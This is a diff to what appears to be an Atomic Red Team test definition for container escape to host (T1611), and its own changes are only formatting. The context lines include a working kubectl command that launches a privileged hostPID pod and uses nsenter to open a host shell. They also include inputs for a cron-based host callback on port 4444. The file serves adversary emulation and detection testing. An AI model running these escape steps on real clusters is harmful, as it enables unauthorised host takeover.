@@ -1,4 +1,3 @@
----
 attack_technique: T1611
 display_name: "Escape to Host"
 
@@ -13,21 +12,21 @@ atomic_tests:
     - https://securekubernetes.com/scenario_2_attack/
   supported_platforms:
   - containers
-  
+
   dependency_executor_name: sh
-  dependencies: 
+  dependencies:
   - description: Verify docker is installed.
     prereq_command: |
       which docker
     get_prereq_command: |
       if [ "" == "`which docker`" ]; then echo "Docker Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else echo "Docker installed"; fi
-  
+
   - description: Verify docker service is running.
     prereq_command: |
       sudo systemctl status docker
     get_prereq_command: |
       sudo systemctl start docker
-  
+
   - description: Verify kind is in the path.
     prereq_command: |
       which kind
@@ -35,13 +34,13 @@ atomic_tests:
       curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
       chmod +x ./kind
       mv kind /usr/bin/kind
-  
+
   - description: Verify kind-atomic-cluster is created
     prereq_command: |
       sudo kind get clusters
     get_prereq_command: |
       sudo kind create cluster --name atomic-cluster
-  
+
   - description: Verify kubectl is in path
     prereq_command: |
       which kubectl
@@ -49,7 +48,7 @@ atomic_tests:
       curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
       chmod +x ./kubectl
       mv kubectl /usr/bin/kubectl
-  
+
   executor:
     command: |
       kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
@@ -69,32 +68,32 @@ atomic_tests:
   input_arguments:
     mount_device:
       description: Path to the device of the host's disk to mount
-      type: Path
+      type: path
       default: /dev/dm-0
 
     mount_point:
       description: Path where the host filesystem will be mounted
-      type: Path
+      type: path
       default: /mnt/T1611.002
 
     cron_path:
       description: Path on the host filesystem where cron jobs are stored
-      type: Path
+      type: path
       default: /etc/cron.d
 
     cron_filename:
       description: Filename of the cron job in cron_path
-      type: String
+      type: string
       default: T1611_002
 
     listen_address:
       description: IP address to listen for callback from the host system.
-      type: String
+      type: string
       default: "`ifconfig eth0 | grep inet | awk '{print $2}'`"
 
     listen_port:
       description: TCP Port to listen on for callback from the host system.
-      type: String
+      type: string
       default: 4444
 
   dependency_executor_name: sh
